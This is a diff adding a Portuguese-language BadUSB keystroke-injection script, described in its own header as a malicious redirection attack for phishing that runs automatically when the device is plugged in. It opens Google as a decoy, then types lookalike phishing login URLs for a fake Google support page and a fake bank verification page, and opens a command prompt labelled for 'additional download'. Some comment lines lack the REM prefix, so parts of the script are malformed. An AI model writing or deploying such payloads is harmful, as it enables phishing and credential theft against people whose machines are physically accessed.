@@ -1,0 +1,57 @@
+REM =================================================================
+REM Ataque BadUSB - Redirecionamento de Sites Malicioso
+REM =================================================================
+REM
+REM Descrição: Script BadUSB que redireciona o navegador para sites
+REM maliciosos ou de phishing após abrir sites legítimos.
+REM
+ Quando usar: Para ataques de phishing e redirecionamento de sites.
+REM
+ Como usar: Conectar o dispositivo BadUSB e o script será executado
+REM automaticamente.
+REM
+ Observações: Modifique os URLs conforme necessário. Pode ser combinado
+REM com outros ataques para maior eficácia.
+REM
+=================================================================
+
+DELAY 1000
+
+Abre o navegador
+GUI r
+DELAY 200
+
+Abre um site legítimo para enganar o usuário
+STRING https://www.google.com
+ENTER
+DELAY 2000
+
+Abre aba nova
+GUI t
+DELAY 500
+
+Abre site malicioso/phishing
+STRING https://www.google.com-support.com/login
+ENTER
+DELAY 1500
+
+Abre mais uma aba com conteúdo malicioso
+GUI t
+DELAY 500
+
+STRING https://secure-login-bank.com/verify
+ENTER
+DELAY 1000
+
+Abre terminal para download adicional
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 1000
+
+STRING echo "Ataque de redirecionamento concluído" > C:\redirecionamento.txt
+ENTER
+
+Fecha o navegador
+ALT F4
